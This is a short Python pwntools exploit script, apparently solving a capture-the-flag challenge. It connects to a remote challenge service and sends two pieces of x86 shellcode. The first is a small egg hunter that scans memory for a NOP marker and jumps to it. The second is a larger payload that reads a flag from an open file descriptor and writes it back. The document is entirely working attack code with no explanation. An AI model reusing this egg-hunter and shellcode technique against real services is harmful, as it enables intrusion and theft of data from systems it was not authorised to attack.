from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

big_code = """
    call a
    a:
    mov eax, 0x3;
    mov ebx, 1000;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
    mov eax, 0x4;
    mov ebx, 0x1;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
"""
small_code = """
    b:
    add eax, 0x4;
    cmp dword ptr [eax], 0x90909090
    jne b;
    jmp eax;
""" 

p = remote("plzpwn.me", "3002")
p.recvuntil("new stack ")
address = p.recv(10)
p.recv()
p.sendline(asm(small_code))
p.recv()
p.sendline(p32(0x90909090)*4 + asm(big_code)+"flag")
p.recv()
p.interactive()

